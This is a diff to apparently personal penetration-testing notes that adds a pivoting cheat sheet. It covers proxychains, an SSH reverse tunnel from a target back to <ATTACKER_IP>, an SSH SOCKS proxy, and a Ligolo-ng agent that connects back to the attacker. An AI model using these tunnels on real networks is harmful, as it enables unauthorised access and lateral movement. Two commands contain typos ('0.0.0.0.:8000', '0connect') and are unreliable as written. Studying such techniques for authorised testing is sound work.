@@ -118,6 +118,47 @@ netsh advfirewall delete rule name="port_forward_ssh_2222"
 ```
 netsh interface portproxy del v4tov4 listenport=2222 listenaddress=<COMPUTER_IP>
 ```
-## Exercises To-Do
-
-- [ ] 2.1.1 (page 20)
+### ProxyChains
+- First edit /etc/proxychains.conf and make sure the below line is added
+```
+...
+socks5 <HOST> 1080
+```
+- Execute commands with proxychains by using 
+```
+proxychains <COMMAND_TO_EXECUTE_ON_TARGET>
+```
+#### SSH
+- From target (ssh server on attacker)
+```
+ssh -fN -R <PORT> root@<ATTACKER_IP>
+```
+- From attacker (ssh server on target)
+```
+ssh -fN -D <PORT> <USER>@<TARGET_IP>
+```
+### Ligolo-ng
+- Prep (on attacker machine)
+```
+ip tuntap add user <USER> mode tun ligolo
+```
+```
+ip link set ligolo up
+```
+```
+ip route add <NETWORK> dev ligolo
+```
+- on attacker (proxy)
+```
+ligolo -selfcert -laddr 0.0.0.0.:8000
+```
+- on target (agent)
+```
+ligolo 0connect <ATTACKER_IP>:8000 -ignore-cert
+```
+- MainUI on attacker
+```
+session
+start
+listener_add --addr 0.0.0.0:<TARGET PORT> --to 127.0.0.1:<KALI PORT> --tcp
+```
